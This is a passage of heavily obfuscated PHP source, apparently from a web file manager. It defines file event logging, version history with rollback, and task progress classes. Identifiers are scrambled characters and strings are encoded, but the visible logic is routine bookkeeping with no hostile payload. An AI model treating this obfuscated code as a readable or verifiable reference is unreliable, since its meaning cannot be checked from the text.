$®ØÚ¡äö[$ø£Ãøş[503]][$ø£Ãøş[794]]; } } $˜¶Û÷€ = array_merge($®ØÚ¡äö, array($ø£Ãøş[2110] => $®ØÚ¡äö[$ø£Ãøş[191]], $ø£Ãøş[2111] => $®ØÚ¡äö[$ø£Ãøş[2111]])); Hook::trigger($ø£Ãøş[2112], $ø£Ãøş[2113] . $ò´Äö‚¼, $®ØÚ¡äö); Model($ø£Ãøş[1827])->addLog($ø£Ãøş[2113] . $ò´Äö‚¼, $˜¶Û÷€); } private function isCacheEvent($ä¿«âçí, $´¦ä’¥) { if ($ä¿«âçí[$_SERVER[ú÷îèÆÜ][188]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ ˜ß ë†, $…§ª¨òÄ) { $øœ¬é‘— =& $_SERVER[ú÷îèÆÜ]; $øú‹ÇÏê = Model($øœ¬é‘—[1373])->sourceInfo($ ˜ß ë†); $Ş »ˆ’· = array($øœ¬é‘—[2108] => $…§ª¨òÄ, $øœ¬é‘—[42] => $øú‹ÇÏê[$øœ¬é‘—[42]]); return $this->addEvent($ ˜ß ë†, $øœ¬é‘—[2107], $Ş »ˆ’·); } public function eventFileEdit($¼Ğ›Â‘§) { $¦™ôÁçû =& $_SERVER[ú÷îèÆÜ]; $Êøëºô’ = array($¦™ôÁçû[2114] => $_SERVER[$¦™ôÁçû[2115]], $¦™ôÁçû[2116] => strtolower(ACTION)); if (isset($GLOBALS[$¦™ôÁçû[17]][$¦™ôÁçû[2117]])) { $Êøëºô’[$¦™ôÁçû[2117]] = $¦™ôÁçû[98]; } return $this->addEvent($¼Ğ›Â‘§, $¦™ôÁçû[1853], $Êøëºô’); } public function eventRecycle($é†ê¥£ , $§£œÂê¾) { return $this->addEvent($é†ê¥£ , $_SERVER[ú÷îèÆÜ][2109], $§£œÂê¾); } public function eventRemove($½ìŠò†) { $…†ÁøÆÒ =& $_SERVER[ú÷îèÆÜ]; $»½ÕÑ¯§ = Model($…†ÁøÆÒ[1373])->sourceInfo($½ìŠò†); $¶æõÃ±ê = $»½ÕÑ¯§[$…†ÁøÆÒ[42]]; return $this->addEvent($»½ÕÑ¯§[$…†ÁøÆÒ[190]], $…†ÁøÆÒ[1852], $¶æõÃ±ê); } public function eventShare($¤ìÁğñü, $ÈÆçÄ˜Œ) { return $this->addEvent($¤ìÁğñü, $_SERVER[ú÷îèÆÜ][1863], $ÈÆçÄ˜Œ); } public function eventMove($õğ¬ÁÖ, $¼²‘¨§½, $“Â¾µ€) { $ìË÷á¨¨ =& $_SERVER[ú÷îèÆÜ]; $ù¼İã±š = Model($ìË÷á¨¨[1373]); $±åè¬š‘ = $ù¼İã±š->sourceInfo($õğ¬ÁÖ); $ÌÚ²¸–‘ = $ù¼İã±š->sourceInfo($¼²‘¨§½); $†£á¿ô× = $ù¼İã±š->sourceInfo($“Â¾µ€); $ÍŞ´ÖË = array($ìË÷á¨¨[1201] => $¼²‘¨§½, $ìË÷á¨¨[2118] => $ÌÚ²¸–‘[$ìË÷á¨¨[42]], $ìË÷á¨¨[2095] => !empty($ÌÚ²¸–‘[$ìË÷á¨¨[560]]) ? $ÌÚ²¸–‘[$ìË÷á¨¨[560]] : $ìË÷á¨¨[22], $ìË÷á¨¨[1202] => $“Â¾µ€, $ìË÷á¨¨[2119] => $†£á¿ô×[$ìË÷á¨¨[42]], $ìË÷á¨¨[2120] => !empty($†£á¿ô×[$ìË÷á¨¨[560]]) ? $†£á¿ô×[$ìË÷á¨¨[560]] : $ìË÷á¨¨[22]); $this->addEvent($õğ¬ÁÖ, $ìË÷á¨¨[597], $ÍŞ´ÖË); $±åè¬š‘ = $ù¼İã±š->sourceInfo($õğ¬ÁÖ); $ÍŞ´ÖË = array($ìË÷á¨¨[191] => $±åè¬š‘[$ìË÷á¨¨[191]], $ìË÷á¨¨[42] => $±åè¬š‘[$ìË÷á¨¨[42]]); $this->addEvent($¼²‘¨§½, $ìË÷á¨¨[2121], $ÍŞ´ÖË); } public function eventCopy($¤Ö°Ì·€) { $this->eventCreate($¤Ö°Ì·€, $_SERVER[ú÷îèÆÜ][595]); } public function eventRename($÷Ï–Ö‚Ô, $ĞÎÉ­¦â, $ã•»ÆíŠ) { $Ç¥Û­®ë =& $_SERVER[ú÷îèÆÜ]; $á¨»¥² = array($Ç¥Û­®ë[1201] => $ĞÎÉ­¦â, $Ç¥Û­®ë[1202] => $ã•»ÆíŠ); return $this->addEvent($÷Ï–Ö‚Ô, $Ç¥Û­®ë[1387], $á¨»¥²); } public function eventAddComment($ïÄ€¨Í, $ˆ‡ÙÒ¼ˆ) { return $this->addEvent($ïÄ€¨Í, $_SERVER[ú÷îèÆÜ][2122], $ˆ‡ÙÒ¼ˆ); } public function eventAddDesc($ÁíÈÒó¢, $¶Ê¦™Ä¬) { return $this->addEvent($ÁíÈÒó¢, $_SERVER[ú÷îèÆÜ][2123], $¶Ê¦™Ä¬); } public function listBySource($ëÇš®Ùè) { $Â•üÜæŒ =& $_SERVER[ú÷îèÆÜ]; $”½©€ñû = Model($Â•üÜæŒ[1373])->sourceInfo($ëÇš®Ùè); $ùš£…ÍÓ = array($Â•üÜæŒ[468] => $ëÇš®Ùè); if ($”½©€ñû[$Â•üÜæŒ[462]] == $Â•üÜæŒ[98]) { $èÔê» = Model($Â•üÜæŒ[1373])->listSearchChildren($ëÇš®Ùè, 20000); $èÔê»[] = $ëÇš®Ùè . $Â•üÜæŒ[431]; $ùš£…ÍÓ = array($Â•üÜæŒ[191] => array($Â•üÜæŒ[17], $èÔê»)); } $àˆà¯ğ‚ = $this->where($ùš£…ÍÓ)->order($Â•üÜæŒ[2124])->selectPage(); if ($àˆà¯ğ‚[$Â•üÜæŒ[419]][$Â•üÜæŒ[420]] == 0) { $àˆà¯ğ‚[$Â•üÜæŒ[419]][$Â•üÜæŒ[420]] = 1; $àˆà¯ğ‚[$Â•üÜæŒ[422]] = array(array($Â•üÜæŒ[468] => $ëÇš®Ùè, $Â•üÜæŒ[2105] => $”½©€ñû[$Â•üÜæŒ[190]], $Â•üÜæŒ[1676] => $”½©€ñû[$Â•üÜæŒ[504]], $Â•üÜæŒ[473] => $Â•üÜæŒ[2125], $Â•üÜæŒ[474] => $”½©€ñû[$Â•üÜæŒ[225]], $Â•üÜæŒ[1678] => $Â•üÜæŒ[22])); } return $this->eventListParse($àˆà¯ğ‚, $ëÇš®Ùè); } private function eventListParse($ÌÌñîÌ, $ŠŒ‰áßÖ) { $ÍİÀ»ü¿ =& $_SERVER[ú÷îèÆÜ]; $´°•Õã¾ = $ÌÌñîÌ[$ÍİÀ»ü¿[422]]; $·Æá»¬å = array_to_keyvalue($´°•Õã¾, $ÍİÀ»ü¿[22], $ÍİÀ»ü¿[191]); $áïÏ’Ö„ = array_to_keyvalue($´°•Õã¾, $ÍİÀ»ü¿[22], $ÍİÀ»ü¿[2111]); foreach ($´°•Õã¾ as $Ä™çÇûĞ) { $¦¿šÖ­Æ = $Ä™çÇûĞ[$ÍİÀ»ü¿[503]]; if ($Ä™çÇûĞ[$ÍİÀ»ü¿[43]] == $ÍİÀ»ü¿[597] && isset($¦¿šÖ­Æ[$ÍİÀ»ü¿[1201]])) { $·Æá»¬å[] = $¦¿šÖ­Æ[$ÍİÀ»ü¿[1201]] . $ÍİÀ»ü¿[22]; $·Æá»¬å[] = $¦¿šÖ­Æ[$ÍİÀ»ü¿[1202]] . $ÍİÀ»ü¿[22]; } if ($Ä™çÇûĞ[$ÍİÀ»ü¿[43]] == $ÍİÀ»ü¿[2121] && isset($¦¿šÖ­Æ[$ÍİÀ»ü¿[191]])) { $·Æá»¬å[] = $¦¿šÖ­Æ[$ÍİÀ»ü¿[191]] . $ÍİÀ»ü¿[22]; } } $·Æá»¬å = array_merge($·Æá»¬å, $áïÏ’Ö„, array($ŠŒ‰áßÖ . $ÍİÀ»ü¿[22])); $·Æá»¬å = array_unique($·Æá»¬å); $‡­ïÌİ = array_unique(array_to_keyvalue($´°•Õã¾, $ÍİÀ»ü¿[22], $ÍİÀ»ü¿[1685])); $öÙÛ•„š = Model($ÍİÀ»ü¿[576])->userListInfo($‡­ïÌİ); $£Ä¾åó = Model($ÍİÀ»ü¿[865])->sourceListInfo($·Æá»¬å, !0); foreach ($´°•Õã¾ as &$Ä™çÇûĞ) { if ($Ä™çÇûĞ[$ÍİÀ»ü¿[43]] == $ÍİÀ»ü¿[597] && isset($Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[1201]])) { $Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[1201]] = $£Ä¾åó[$Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[1201]]]; $Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[1202]] = $£Ä¾åó[$Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[1202]]]; } if ($Ä™çÇûĞ[$ÍİÀ»ü¿[43]] == $ÍİÀ»ü¿[2121] && isset($Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[191]])) { $Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[191]] = $£Ä¾åó[$Ä™çÇûĞ[$ÍİÀ»ü¿[503]][$ÍİÀ»ü¿[191]]]; } $Ä™çÇûĞ[$ÍİÀ»ü¿[97]] = $£Ä¾åó[$Ä™çÇûĞ[$ÍİÀ»ü¿[191]]]; $Ä™çÇûĞ[$ÍİÀ»ü¿[2126]] = $£Ä¾åó[$Ä™çÇûĞ[$ÍİÀ»ü¿[2111]]]; if ($Ä™çÇûĞ[$ÍİÀ»ü¿[43]] == $ÍİÀ»ü¿[1852]) { $Ä™çÇûĞ[$ÍİÀ»ü¿[2126]] = $Ä™çÇûĞ[$ÍİÀ»ü¿[97]]; $Ä™çÇûĞ[$ÍİÀ»ü¿[2111]] = $Ä™çÇûĞ[$ÍİÀ»ü¿[2126]][$ÍİÀ»ü¿[191]]; $Ä™çÇûĞ[$ÍİÀ»ü¿[97]] = !1; $Ä™çÇûĞ[$ÍİÀ»ü¿[191]] = $ÍİÀ»ü¿[22]; } $Ä™çÇûĞ[$ÍİÀ»ü¿[2055]] = $öÙÛ•„š[$Ä™çÇûĞ[$ÍİÀ»ü¿[1685]]]; } unset($Ä™çÇûĞ); $ÌÌñîÌ[$ÍİÀ»ü¿[422]] = $´°•Õã¾; return $ÌÌñîÌ; } public function removeBySource($‘½–”‚á) { $‹µâ®´€ = array($_SERVER[ú÷îèÆÜ][468] => $‘½–”‚á); $this->where($‹µâ®´€)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\143\x65\x5f\x68\151\163\x74\157\162\171"; public function historyCount($óš°éÌ) { $¸Í‚Ö =& $_SERVER[ú÷îèÆÜ]; if (!$óš°éÌ) { return array(); } if (is_string($óš°éÌ) || is_int($óš°éÌ)) { $óš°éÌ = array($óš°éÌ); } $âşÍâ÷ù = array($¸Í‚Ö[191], $¸Í‚Ö[1916] => $¸Í‚Ö[542]); $¦àÙ… = array($¸Í‚Ö[191] => array($¸Í‚Ö[17], $óš°éÌ)); $ÅÊÀùŠó = $this->field($âşÍâ÷ù)->where($¦àÙ…)->group($¸Í‚Ö[191])->select(); return array_to_keyvalue($ÅÊÀùŠó, $¸Í‚Ö[191], $¸Í‚Ö[542]); } public function addHistory($šÛ½²à, $È´šÒ‹À = '') { $ô¤ÅÌæ =& $_SERVER[ú÷îèÆÜ]; $ÛèÛ‘‘š = array($ô¤ÅÌæ[468] => $šÛ½²à[$ô¤ÅÌæ[191]], $ô¤ÅÌæ[1676] => isset($šÛ½²à[$ô¤ÅÌæ[506]]) ? $šÛ½²à[$ô¤ÅÌæ[506]] : $šÛ½²à[$ô¤ÅÌæ[504]], $ô¤ÅÌæ[519] => $šÛ½²à[$ô¤ÅÌæ[518]], $ô¤ÅÌæ[594] => $šÛ½²à[$ô¤ÅÌæ[86]], $ô¤ÅÌæ[2127] => $È´šÒ‹À); if ($GLOBALS[$ô¤ÅÌæ[16]][$ô¤ÅÌæ[99]][$ô¤ÅÌæ[1258]] >= 1) { $this->historyAutoClear($ÛèÛ‘‘š[$ô¤ÅÌæ[191]]); $this->add($ÛèÛ‘‘š); } Hook::trigger($ô¤ÅÌæ[2128], $ÛèÛ‘‘š); Model($ô¤ÅÌæ[2129])->eventFileEdit($šÛ½²à[$ô¤ÅÌæ[191]]); } private function historyAutoClear($ä˜ëÏÖ„) { $©ÅœÎÉ¥ =& $_SERVER[ú÷îèÆÜ]; $²“‘šò = Model($©ÅœÎÉ¥[810])->get($©ÅœÎÉ¥[1280]); $ÎöæíÒË = $GLOBALS[$©ÅœÎÉ¥[16]][$©ÅœÎÉ¥[99]][$©ÅœÎÉ¥[1258]]; $ŠøÉ”²õ = $²“‘šò == $©ÅœÎÉ¥[1281] ? min(5, $ÎöæíÒË) : $ÎöæíÒË; $ŠøÉ”²õ = $ŠøÉ”²õ <= 0 ? 0 : $ŠøÉ”²õ - 1; if ($ŠøÉ”²õ >= 500) { return; } $Ü—Ë­ÃË = array($©ÅœÎÉ¥[468] => $ä˜ëÏÖ„); $«ûïÄ±ş = $this->field($©ÅœÎÉ¥[2130])->where($Ü—Ë­ÃË)->order($©ÅœÎÉ¥[2124])->select(); if (!$«ûïÄ±ş || $ŠøÉ”²õ >= count($«ûïÄ±ş)) { return; } $È–Ÿë—Â = array_to_keyvalue($«ûïÄ±ş, $©ÅœÎÉ¥[22], $©ÅœÎÉ¥[452]); $È–Ÿë—Â = array_slice($È–Ÿë—Â, $ŠøÉ”²õ); $æ·…ˆÙ® = array_to_keyvalue($«ûïÄ±ş, $©ÅœÎÉ¥[22], $©ÅœÎÉ¥[518]); $æ·…ˆÙ® = array_slice($æ·…ˆÙ®, $ŠøÉ”²õ); if (!$È–Ÿë—Â || !$æ·…ˆÙ®) { return; } $Ü—Ë­ÃË = array($©ÅœÎÉ¥[470] => array($©ÅœÎÉ¥[17], $È–Ÿë—Â)); $this->where($Ü—Ë­ÃË)->delete(); Model($©ÅœÎÉ¥[521])->remove($æ·…ˆÙ®); } public function listData($§€¥†¾‘) { $¾õµ¯óì =& $_SERVER[ú÷îèÆÜ]; $Ùö§–³ª = array($¾õµ¯óì[468] => $§€¥†¾‘); $Äëâ’ğ× = $¾õµ¯óì[2131]; $ú­Â…Ûå = $this->field($Äëâ’ğ×)->where($Ùö§–³ª)->order($¾õµ¯óì[2124])->selectPage(); $this->_listAppendUser($ú­Â…Ûå[$¾õµ¯óì[422]]); $Ü„ˆäó = Model($¾õµ¯óì[810])->get($¾õµ¯óì[1280]); $ü±Â‹ë = 5; if ($Ü„ˆäó == $¾õµ¯óì[1281]) { $ú­Â…Ûå[$¾õµ¯óì[422]] = array_slice($ú­Â…Ûå[$¾õµ¯óì[422]], 0, $ü±Â‹ë); $ú­Â…Ûå[$¾õµ¯óì[419]] = array($¾õµ¯óì[2132] => 1, $¾õµ¯óì[2133] => 20, $¾õµ¯óì[2134] => 1, $¾õµ¯óì[2135] => count($ú­Â…Ûå[$¾õµ¯óì[422]])); } return $ú­Â…Ûå; } protected function _listAppendUser(&$ÉØùŸÒ‡) { $ÜÍ¡§±Ò =& $_SERVER[ú÷îèÆÜ]; $İÈ‘½­ = array_to_keyvalue($ÉØùŸÒ‡, $ÜÍ¡§±Ò[22], $ÜÍ¡§±Ò[1685]); $­ÂÍÔ’ø = Model($ÜÍ¡§±Ò[576])->userListInfo($İÈ‘½­); foreach ($ÉØùŸÒ‡ as &$¾½¡ÌŠÅ) { $Ì¹ŒÒß = $¾½¡ÌŠÅ[$ÜÍ¡§±Ò[1685]]; $¾½¡ÌŠÅ[$ÜÍ¡§±Ò[504]] = $­ÂÍÔ’ø[$Ì¹ŒÒß] ? $­ÂÍÔ’ø[$Ì¹ŒÒß] : !1; } unset($¾½¡ÌŠÅ); } public function fileInfo($èÉ˜ÃøÀ) { $ÀÙ™†“Ø =& $_SERVER[ú÷îèÆÜ]; $˜õä¼Ñ = $this->tablePrefix; $¦á±‹‚³ = "{$˜õä¼Ñ}\151\157\137\x66\151\154\x65\40\146\x69\154\x65\x73\40\x6f\156\40\x66\151\x6c\x65\163\x2e\146\x69\x6c\x65\x49\104\40\x3d\x20\x68\151\x73\x74\157\162\x79\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($ÀÙ™†“Ø[2136])->where(array($ÀÙ™†“Ø[470] => $èÉ˜ÃøÀ))->join($¦á±‹‚³, $ÀÙ™†“Ø[2137])->find(); } public function removeItem($µè ‘Ó­) { $ÖÍÇ¡š =& $_SERVER[ú÷îèÆÜ]; $Ì«×—”Ã = array($ÖÍÇ¡š[470] => $µè ‘Ó­); $˜Øš¹ôÔ = $this->where($Ì«×—”Ã)->find(); if ($˜Øš¹ôÔ) { $èğÁ±ä· = $this->where($Ì«×—”Ã)->delete(); Model($ÖÍÇ¡š[521])->remove($˜Øš¹ôÔ[$ÖÍÇ¡š[518]]); return $èğÁ±ä·; } return !1; } public function removeBySource($ü•õ‘ĞÊ) { $öƒß™Ş =& $_SERVER[ú÷îèÆÜ]; if (!$ü•õ‘ĞÊ) { return !1; } if (!is_array($ü•õ‘ĞÊ)) { $ü•õ‘ĞÊ = array($ü•õ‘ĞÊ); } $ä¦ß±ı = array($öƒß™Ş[468] => array($öƒß™Ş[17], $ü•õ‘ĞÊ)); $ª×Ûş = $this->field($öƒß™Ş[519])->where($ä¦ß±ı)->select(); if ($ª×Ûş) { $this->where($ä¦ß±ı)->delete(); $÷¤ó£ıË = array_to_keyvalue($ª×Ûş, $öƒß™Ş[22], $öƒß™Ş[518]); Model($öƒß™Ş[521])->remove($÷¤ó£ıË); } return !0; } public function setDetail($ã½àâ¸“, $é„”à›Ü) { $ÍœÌ°µ =& $_SERVER[ú÷îèÆÜ]; return $this->where(array($ÍœÌ°µ[470] => $ã½àâ¸“))->save(array($ÍœÌ°µ[2127] => $é„”à›Ü)); } public function rollbackToItem($ÑõÎĞğà, $ƒ«äÔì) { $ŞËÅé’Ø =& $_SERVER[ú÷îèÆÜ]; $Ÿş›­¹İ = Model($ŞËÅé’Ø[865])->sourceInfo($ÑõÎĞğà); $this->addHistory($Ÿş›­¹İ, LNG($ŞËÅé’Ø[2138])); $ÜŠßËş± = $this->find($ƒ«äÔì); $«¡ËŠŒˆ = array($ŞËÅé’Ø[518] => $ÜŠßËş±[$ŞËÅé’Ø[518]], $ŞËÅé’Ø[86] => $ÜŠßËş±[$ŞËÅé’Ø[86]], $ŞËÅé’Ø[95] => time(), $ŞËÅé’Ø[506] => USER_ID); Model($ŞËÅé’Ø[865])->where(array($ŞËÅé’Ø[191] => $ÑõÎĞğà))->save($«¡ËŠŒˆ); return $this->where(array($ŞËÅé’Ø[470] => $ƒ«äÔì))->delete(); } public function clearSame($ß¿° ±Ó) { $Õî•‚½ =& $_SERVER[ú÷îèÆÜ]; $ş÷Ä¹»Ş = $this->listData($ß¿° ±Ó); $“ÅÙÂ†ï = array_to_keyvalue_group($ş÷Ä¹»Ş, $Õî•‚½[518]); $—Í»°¼² = array(); $Í€å¤¿ = array(); foreach ($“ÅÙÂ†ï as $õÙ­øÙÈ) { if (!$õÙ­øÙÈ || count($õÙ­øÙÈ) <= 1) { continue; } foreach ($õÙ­øÙÈ as $É˜ÎÙØ¢) { $—Í»°¼²[] = $É˜ÎÙØ¢[$Õî•‚½[518]]; $Í€å¤¿[] = $É˜ÎÙØ¢[$Õî•‚½[452]]; } } if (!$Í€å¤¿) { return; } $this->where(array($Õî•‚½[452] => array($Õî•‚½[17], $Í€å¤¿)))->delete(); Model($Õî•‚½[521])->remove($—Í»°¼²); } public function userSpace() { $ñŒ“È¥Ü =& $_SERVER[ú÷îèÆÜ]; $•­ÀÜ×  = $this->tablePrefix; $‹êô·‡Ä = array($ñŒ“È¥Ü[1676] => USER_ID); $áöçúÈ = "{$•­ÀÜ× }\x69\157\x5f\146\151\154\145\x20\146\x69\154\145\163\x20\157\156\40\x66\151\x6c\x65\163\x2e\x66\x69\x6c\x65\111\104\40\75\40\150\x69\163\x74\157\162\171\x2e\146\151\x6c\x65\111\104"; return $this->alias($ñŒ“È¥Ü[2136])->where($‹êô·‡Ä)->join($áöçúÈ, $ñŒ“È¥Ü[2137])->sum($ñŒ“È¥Ü[86]); } } goto aŠÙ›½Œ¾Ó; EˆøŞÌ‘î: class TaskHttp extends Task { protected function startAfter() { $ÙÒÆÖëá =& $_SERVER[ú÷îèÆÜ]; $¾™îß¤ =& $this->task; $¾™îß¤[$ÙÒÆÖëá[1762]] = 1; Hook::bind($ÙÒÆÖëá[1730], array($this, $ÙÒÆÖëá[1763])); Hook::bind($ÙÒÆÖëá[1732], array($this, $ÙÒÆÖëá[1764])); Hook::bind($ÙÒÆÖëá[1734], array($this, $ÙÒÆÖëá[1765])); } protected function endAfter() { $‡ûÈ‰¹ê =& $_SERVER[ú÷îèÆÜ]; Hook::unbind($‡ûÈ‰¹ê[1730], array($this, $‡ûÈ‰¹ê[1763])); Hook::unbind($‡ûÈ‰¹ê[1732], array($this, $‡ûÈ‰¹ê[1764])); Hook::unbind($‡ûÈ‰¹ê[1734], array($this, $‡ûÈ‰¹ê[1765])); } public function progressStart($óŠ×ë³º) { $…œ«©Û =& $_SERVER[ú÷îèÆÜ]; $½¸°åâÅ = curl_getinfo($óŠ×ë³º); self::log($…œ«©Û[1766] . $½¸°åâÅ[$…œ«©Û[360]]); self::valueSet($this->task[$…œ«©Û[452]], $this->task); } public function progressEnd($ùú¸‚Å») { $öÆ·È×ü =& $_SERVER[ú÷îèÆÜ]; self::log($öÆ·È×ü[1767] . $this->task[$öÆ·È×ü[452]]); $this->end(); } public function progress($½ú¯¼‘ç, $¶ áÂ°û, $‰’Í£êâ, $—•¢¸í¥, $İöÌÎÇı) { $´òëåšü =& $_SERVER[ú÷îèÆÜ]; $‹Æ‹á¼û =& $this->task; if ($İöÌÎÇı > 0) { $‹Æ‹á¼û[$´òëåšü[826]] = $‹Æ‹á¼û[$´òëåšü[826]] == 0 ? $—•¢¸í¥ : $‹Æ‹á¼û[$´òëåšü[826]]; $‹Æ‹á¼û[$´òëåšü[1686]] = $İöÌÎÇı; } else { if ($‰’Í£êâ > 0) { $‹Æ‹á¼û[$´òëåšü[826]] = $‹Æ‹á¼û[$´òëåšü[826]] == 0 ? $¶ áÂ°û : $‹Æ‹á¼û[$´òëåšü[826]]; $‹Æ‹á¼û[$´òëåšü[1686]] = $‰’Í£êâ; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\x65\x73\x73\x48\x74\x74\160\x3a\144\157\167\x6e\72{$‰’Í£êâ}\57{$¶ áÂ°û}\x3b\40\x75\160\154\157\x61\x64\72{$İöÌÎÇı}\x2f{$—•¢¸í¥}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¡İ¥ŒË, $šÅô ¬¤ = '', $‘İÖ¥áú = 0, $Úı¸²Éá = '') { $èÇëªÄ =& $_SERVER[ú÷îèÆÜ]; $Ï¸§Éª© = new Task($¡İ¥ŒË, $šÅô ¬¤, $‘İÖ¥áú, $Úı¸²Éá); $GLOBALS[$èÇëªÄ[1768] . $¡İ¥ŒË] = new TaskLog($èÇëªÄ[1669], $Ï¸§Éª©, $Úı¸²Éá); return $Ï¸§Éª©; } public function __construct($è–µĞë¿ = '', $ÉÜÆĞ½± = '', $Ü¹©ŠëÍ = '') { $‹ãÇ®íà =& $_SERVER[ú÷îèÆÜ]; if (!$è–µĞë¿) { $è–µĞë¿ = $‹ãÇ®íà[1669]; } $×ş¤¨»š = $è–µĞë¿ . $‹ãÇ®íà[439] . rand_string(10); if (!$Ü¹©ŠëÍ) { $Ü¹©ŠëÍ = $è–µĞë¿ . $‹ãÇ®íà[63] . $Ü¹©ŠëÍ; } switch ($è–µĞë¿) { case $‹ãÇ®íà[1669]: if (!$ÉÜÆĞ½± || !$ÉÜÆĞ½±->task) { return echoLog($è–µĞë¿ . $‹ãÇ®íà[1769]); } $ÈÕ­Ï•Á = $ÉÜÆĞ½±; $×ş¤¨»š = $ÈÕ­Ï•Á->task[$‹ãÇ®íà[452]]; $è–µĞë¿ = $ÈÕ­Ï•Á->task[$‹ãÇ®íà[452]]; if (!$ÈÕ­Ï•Á->task[$‹ãÇ®íà[1582]]) { $ÈÕ­Ï•Á->task[$‹ãÇ®íà[1582]] = $Ü¹©ŠëÍ ? $Ü¹©ŠëÍ : $è–µĞë¿; } break; case $‹ãÇ®íà[1770]: if (!$ÉÜÆĞ½±) { return echoLog($è–µĞë¿ . $‹ãÇ®íà[1771]); } $ååŞï• = is_string($ÉÜÆĞ½±) ? array($ÉÜÆĞ½±) : $ÉÜÆĞ½±; $ÈÕ­Ï•Á = new TaskFileTransfer($×ş¤¨»š, $è–µĞë¿, 0, $Ü¹©ŠëÍ ? $Ü¹©ŠëÍ : $ååŞï•[0]); foreach ($ååŞï• as $Œä¢ÔÉ ) { $ÈÕ­Ï•Á->addPath($Œä¢ÔÉ ); } break; case $‹ãÇ®íà[366]: if (!$ÉÜÆĞ½±) { return echoLog($è–µĞë¿ . $‹ãÇ®íà[1771]); } $ååŞï• = is_string($ÉÜÆĞ½±) ? array($ÉÜÆĞ½±) : $ÉÜÆĞ½±; $ÈÕ­Ï•Á = new TaskZip($×ş¤¨»š, $è–µĞë¿, 0, $Ü¹©ŠëÍ ? $Ü¹©ŠëÍ : $ååŞï•[0]); foreach ($ååŞï• as $Œä¢ÔÉ ) { $ÈÕ­Ï•Á->addPath($Œä¢ÔÉ ); } break; case $‹ãÇ®íà[1255]: if (!$ÉÜÆĞ½±) { return echoLog($è–µĞë¿ . $‹ãÇ®íà[1771]); } $ÈÕ­Ï•Á = new TaskUnZip($×ş¤¨»š, $è–µĞë¿, 0, $Ü¹©ŠëÍ ? $Ü¹©ŠëÍ : $ÉÜÆĞ½±); if ($ÉÜÆĞ½±) { $ÈÕ­Ï•Á->addFile($ÉÜÆĞ½±); } break; case $‹ãÇ®íà[159]: $ÈÕ­Ï•Á = new TaskHttp($×ş¤¨»š, $è–µĞë¿); break; default: return; break; } $this->task = $ÈÕ­Ï•Á; $this->taskID = $×ş¤¨»š; Hook::bind($‹ãÇ®íà[1706], array($this, $‹ãÇ®íà[1772])); Hook::bind($‹ãÇ®íà[1708], array($this, $‹ãÇ®íà[1773])); Hook::bind($‹ãÇ®íà[1702], array($this, $‹ãÇ®íà[1774])); echoLog($‹ãÇ®íà[1775] . $ÈÕ­Ï•Á->task[$‹ãÇ®íà[1582]]); } public function __destruct() { $this->end(); } public function end($óÊÉ­­Ã = '') { $É©ˆšÇÌ =& $_SERVER[ú÷îèÆÜ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($óÊÉ­­Ã); $this->task = !1; $this->taskID = !1; Hook::unbind($É©ˆšÇÌ[1706], array($this, $É©ˆšÇÌ[1772])); Hook::unbind($É©ˆšÇÌ[1708], array($this, $É©ˆšÇÌ[1773])); Hook::unbind($É©ˆšÇÌ[1702], array($this, $É©ˆšÇÌ[1774])); } public function taskUpdate($„¥óŞšÇ) { $¡—ŒÇúî =& $_SERVER[ú÷îèÆÜ]; if (!$„¥óŞšÇ || $this->taskID != $„¥óŞšÇ[$¡—ŒÇúî[452]]) { return; } $Ìİº¼¨€ = 20; $™µ”ÔìŸ = intval($„¥óŞšÇ[$¡—ŒÇúî[1687]] * $Ìİº¼¨€); $¤ûÑÁ¨ = $¡—ŒÇúî[173] . str_repeat($¡—ŒÇúî[925], $™µ”ÔìŸ) . $¡—ŒÇúî[1055] . str_repeat($¡—ŒÇúî[63], $Ìİº¼¨€ - $™µ”ÔìŸ) . $¡—ŒÇúî[175]; $Î”‹ÇÀ = $¤ûÑÁ¨ . sprintf($¡—ŒÇúî[1776], $„¥óŞšÇ[$¡—ŒÇúî[1687]] * 100) . $¡—ŒÇúî[1777]; $³ÃŠßÖ» = $Î”‹ÇÀ . $„¥óŞšÇ[$¡—ŒÇúî[1686]] . $¡—ŒÇúî[18] . $„¥óŞšÇ[$¡—ŒÇúî[826]] . LNG($¡—ŒÇúî[1778]); $Îõ‡å‡¬ = $¡—ŒÇúî[22]; if ($„¥óŞšÇ[$¡—ŒÇúî[1762]]) { $³ÃŠßÖ» = $Î”‹ÇÀ . size_format($„¥óŞšÇ[$¡—ŒÇúî[1686]]) . $¡—ŒÇúî[18] . size_format($„¥óŞšÇ[$¡—ŒÇúî[826]]); $Îõ‡å‡¬ = size_format($„¥óŞšÇ[$¡—ŒÇúî[1688]]) . $¡—ŒÇúî[1779]; } if ($„¥óŞšÇ[$¡—ŒÇúî[1105]]) { $„¥óŞšÇ[$¡—ŒÇúî[1736]] = $„¥óŞšÇ[$¡—ŒÇúî[1105]] . $¡—ŒÇúî[63] . $„¥óŞšÇ[$¡—ŒÇúî[1736]]; } if ($„¥óŞšÇ[$¡—ŒÇúî[1736]]) { $ ‘“¶Ä = $¡—ŒÇúî[22]; if ($„¥óŞšÇ[$¡—ŒÇúî[1738]]) { $ ‘“¶Ä = $¡—ŒÇúî[60] . size_format($„¥óŞšÇ[$¡—ŒÇúî[1739]]) . $¡—ŒÇúî[18] . size_format($„¥óŞšÇ[$¡—ŒÇúî[1738]]); } $Îõ‡å‡¬ .= $„¥óŞšÇ[$¡—ŒÇúî[1736]] . $ ‘“¶Ä; } if ($„¥óŞšÇ[$¡—ŒÇúî[803]] && !$„¥óŞšÇ[$¡—ŒÇúî[1738]]) { $Îõ‡å‡¬ .= $¡—ŒÇúî[63] . 